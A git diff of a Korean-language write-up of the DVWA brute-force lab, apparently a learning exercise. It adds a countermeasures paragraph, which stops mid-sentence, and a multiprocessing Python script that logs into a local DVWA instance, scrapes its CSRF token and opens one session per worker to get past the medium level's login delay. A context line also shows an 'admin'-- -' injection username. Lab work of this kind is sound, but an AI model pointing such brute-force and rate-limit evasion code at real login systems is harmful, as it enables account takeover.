@@ -149,21 +149,27 @@ username: admin'-- -
 <br/>
 
 # 3. 대응방안
-#TODO
+대응방안으로는 암호를 생성할 때 강력한 암호를 생성하기, 일정 횟수 이상의 로그인 실패시 계정을 일시적으로 제한을 하는것, CAPTHA, 2차인증, IP차단 등이 있다.
+
+CAPTHA는 
 
 # 4. 툴 제작
-
+[https://github.com/Jimin0605/DVWA_tools/blob/main/tools/BrutForce_ver_1.1.py](https://github.com/Jimin0605/DVWA_tools/blob/main/tools/BrutForce_ver_1.1.py)
 ```python
+'''
+brut force 병렬처리 성공
+'''
+
 from multiprocessing import Pool
 import requests
-import time
+import bs4
 
-url = "http://localhost/vulnerabilities/brute/"
-cookie = "l6gt2gtuqki4ki22c8mq7rsuh5"
-level = "medium"
-head = {"PHPSESSID":f"{cookie}", "security":f"{level}"}
+'''
+파일을 불러와 tasks라는 변수에 리스트 형식으로 반환
 
-
+@param 문자열 리스트가 있는 파일위치
+@return 문자열 리스트
+'''
 def read_file(filename):
     tasks = []
     with open(filename, 'r') as file:
@@ -172,53 +178,76 @@ def read_file(filename):
     return tasks
 
 
+'''
+username, password, Login의 값과 Beautifulsoup을 이용해 찾아낸 user_toke으로
+새로운 session 찾기
+
+@return Session 객체
+'''
+def session_set():
+    with requests.Session() as s:
+        url = "http://localhost/login.php"
+        login_info = {
+            "username": "admin",
+            "password": "password",
+            "Login": "Login",
+            }
+
+        user_token = bs4.BeautifulSoup(s.get(url).text, 'html.parser').select('input[name="user_token"]')[0]['value']
+        login_info['user_token'] = user_token       # create user_token
+
+        s.post(url, data=login_info)
+
+        return s
+
+
+'''
+medium level의 brut force메뉴 에서 username: admin인 상태로 password brut force진행
+get요청을 보낸 후 응답코드 200과 response.text값 안에 'Welcome to the password protected area'라는 문자열이 있을경우
+현 password 반환
+
+@param 문자열 리스트
+@return 로그인이 성공한 password
+'''
 def brut_force(passwordList):
-    global url
-    global head
+    s = session_set()
+    url = "http://localhost/vulnerabilities/brute/"
+    level = "medium"
+    head = {"PHPSESSID": s.cookies['PHPSESSID'], "security": level}
+
     for password in passwordList:
         param = f"?username=admin&password={password}&Login=Login"
         payload = url+param
         print("input password:",password)
         response = requests.get(payload, cookies=head)
+        # print(response.cookies)
+        # print(response.text)
         if (response.status_code == 200 and 'Welcome to the password protected area' in response.text):
             return password
+        
 
 
-
-# # TEST 병렬처리O
 if __name__ == '__main__':
-    start = int(time.time())
     num_cores = 8
     pool = Pool(num_cores)
-    filename = 'tools/passwordlist1.txt'
+    filename = 'tools/passwordlist.txt'
     tasks = read_file(filename)
     results = pool.map(brut_force, tasks)
-    end = int(time.time())
 
     for result in results:
-        print(result)
-    print(f"걸린시간: {end-start}sec.")
-
-
-# TEST 병렬처리X
-# start = int(time.time())
-# filename = 'tools/passwordlist1.txt'
-# tasks = read_file(filename)
-# print(brut_force(tasks))
-# end = int(time.time())
-# print(f"걸린시간: {end-start}sec.")
-
-
-# 코어 수 확인
-# import multiprocessing
-
-# num_cores = multiprocessing.cpu_count()
-# print(f"시스템의 CPU 코어 수: {num_cores}")
-
+        if result:
+            print("\n\nBruteforce SUCCESS!!")
+            print("password is", result)
 ```
+처음 툴을 제작할 때 처음 완성이 됬던 github link에 있는 brut force ver 1.1을 실행을 했을 때 input을 했던 password 들이 처음에는 8개(core의 수를 8개로 설정해 두었음)로 나왔지만 이후로는 시간이 조금 흐른뒤 password input이 하나 나오고 이후로는 약 2초 간격으로 input이 하나씩 되는 것을 확인 할 수 있었다. 즉, medium난이도의 brut force에서 sleep(2)라는 http요청의 시간지연을 우회하기 위해 pyhton에서 제공하는 multiprocessing모듈에서 Pool을 이용해 병렬처리를 해주었지만 실패를 했다.
+
+실패의 원인을 분석해보았을 때 함수를 실행할 때에는 병렬 처리가 잘 되었지만 요청을 보내는 부분에서 문제가 있던것이었다. requests.get으로 요청을 보낼 때 아무리 요청을 8개를 보내도 처음 받은 요청으로 인해 2초씩 시간지연이 발생하기 때문이다. 원래라면 요청 8개를 보냈을 때 서로 독립적으로 응답을 받고 2초씩 시간 지연이 생기는 방식으로 되어야 하는데 각 코어의 요청이 독립적으로 요청을 보내고 있지 않기에 이런 문제가 발생한 것이었다.
+
+이것을 해결하기 위해 한개의 로그인상태가 아닌 각각의 세션들을 만들어 요청을 보내기위해 session_set이라는 함수를 만들어 로그인을 할 때 필요한 파라미터인 username과 password, Login은 각각 admin, password, Login으로 입력해주고 user_token은 BeautifulSoup을 이용해 token을 가져와 입력을 하게 해주었다. 그리고 login폼에 post요청으로 login_info와 함께 요청을 보내주면 새로운 세션이 만들어진다. brut force 함수를 실행 할 때 8개의 코어로 나누어 실행하므로써 각각의 새로운 세션이 만들어지고 이를통해 서로 독립적으로 요청이 보내져 한번에 8개의 password값을 입력할 수 있게 되는것이다.
 
 
 
 ## 레퍼런스
 - **grootsecurity** - DVWA 브루트포스에 대한 writeup 예시:
 [https://security.grootboan.com/follow-along/undefined/0-dvwa/reference-writeup](https://security.grootboan.com/follow-along/undefined/0-dvwa/reference-writeup)
+- Seung Jae Lee - Brute Force Attack Countermeasures (무차별 공격 대응방안): [https://koreanblacklee.github.io/posts/database/bruteforce](https://koreanblacklee.github.io/posts/database/bruteforce)
